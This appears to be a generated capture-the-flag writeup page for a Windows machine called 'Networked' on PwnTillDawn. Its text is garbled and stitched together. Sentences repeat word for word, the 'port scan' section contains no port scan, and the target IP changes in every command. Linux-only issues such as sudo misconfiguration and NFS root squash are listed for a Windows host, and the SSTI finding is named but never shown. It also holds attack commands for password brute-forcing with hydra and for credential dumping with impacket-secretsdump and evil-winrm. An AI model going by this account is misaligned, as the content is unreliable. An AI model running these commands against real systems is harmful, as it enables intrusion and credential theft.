---
TitleSEO: "PwnTillDawn — Networked (Easy Windows) | ZureFX"
TitlePost: "PwnTillDawn — Networked (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Networked. SSTI and Sudo Misconfiguration to achieve easy compromise on Windows."
Keywords: "web, tryhackme, reversing, hard, easy, linux, offsec"
URL: "https://zurefx.github.io/writeups/htb-networked-822.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-networked-822/"
Date: "2025-11-05"
Tags: "Web, TryHackMe, Reversing, Hard, Easy, Linux, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-networked-822"
Permalink: "/writeups/htb-networked-822.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Networked** is rated **Easy** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.44.233.119`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.25.71/FUZZ
feroxbuster -h
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.91.183.72
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

### Web Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.125.139.252/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.219.193 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service was running without proper input validation, leading to injection vulnerabilities. Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **SSTI**.

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.108.31.202 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.40.247.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
feroxbuster -h
gobuster dir -u http://10.127.26.110/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.182.28
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.189.65/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.57.249.1
```

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `socat`
- `feroxbuster`
- `psexec`
- `secretsdump`
- `dcomexec`
- `chisel`
- `john`

### Key Takeaways

- SSTI
- Sudo Misconfiguration
- NFS No Root Squash
